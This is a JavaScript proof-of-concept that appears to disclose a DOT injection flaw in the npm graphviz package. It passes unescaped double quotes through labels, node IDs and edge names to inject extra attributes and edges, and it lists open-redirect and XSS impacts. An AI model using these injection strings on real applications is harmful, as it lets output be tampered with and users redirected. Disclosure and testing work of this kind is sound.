/**
 * PoC #1: CWE-74 — DOT Injection via Unescaped Double Quotes
 * Package: graphviz v0.0.9 (513K weekly downloads)
 *
 * The quoteMe() function in lib/deps/attributs.js wraps attribute values
 * in double quotes but does NOT escape double quotes within the value.
 *
 * Node.to_dot() wraps node IDs in double quotes without escaping.
 * Edge.to_dot() does the same for edge node IDs.
 *
 * An attacker can inject arbitrary DOT attributes/syntax by including
 * double quotes in node IDs or attribute values.
 */
const graphviz = require('graphviz');

// --- Demonstration 1: DOT injection via attribute value ---
console.log("=== DOT Injection via Attribute Value ===\n");

const g1 = graphviz.digraph('test');
const n1 = g1.addNode('A');
const n2 = g1.addNode('B');

// Inject a malicious label that breaks out of the double-quoted string
// This injects additional DOT attributes
n1.set('label', 'safe_label');
n2.set('label', 'hello"; color="red"; shape="Msquare');

console.log("Generated DOT output:");
console.log(g1.to_dot());
console.log();

// Expected output shows injected attributes:
//   "B" [ label = "hello"; color="red"; shape="Msquare" ]
// The attacker injected color and shape attributes!

// --- Demonstration 2: DOT injection via node ID ---
console.log("=== DOT Injection via Node ID ===\n");

const g2 = graphviz.digraph('test2');
const injectedNode = g2.addNode('A"; "B" -> "A'); // Inject an edge via node ID!
g2.addNode('B');

console.log("Generated DOT output:");
console.log(g2.to_dot());
console.log();

// The node ID contains unescaped double quotes,
// which break the DOT syntax and inject arbitrary graph elements.

// --- Demonstration 3: Edge DOT injection ---
console.log("=== DOT Injection via Edge ===\n");

const g3 = graphviz.digraph('test3');
g3.addNode('safe1');
g3.addNode('safe2');
g3.addEdge('safe1', 'safe2');

// Now add an edge with injected node name
g3.addEdge('safe1" -> "safe2" [style=dashed]; "inject', 'safe2');

console.log("Generated DOT output:");
console.log(g3.to_dot());
console.log();

console.log("=== Impact ===");
console.log("- Attacker can inject arbitrary DOT attributes (color, shape, URL, etc.)");
console.log("- Attacker can inject additional nodes, edges, and subgraphs");
console.log("- When rendered to SVG, injected URL attributes create clickable links");
console.log("  pointing to attacker-controlled domains (CWE-601: Open Redirect)");
console.log("- When using HTML-like labels, XSS may be possible in SVG output");
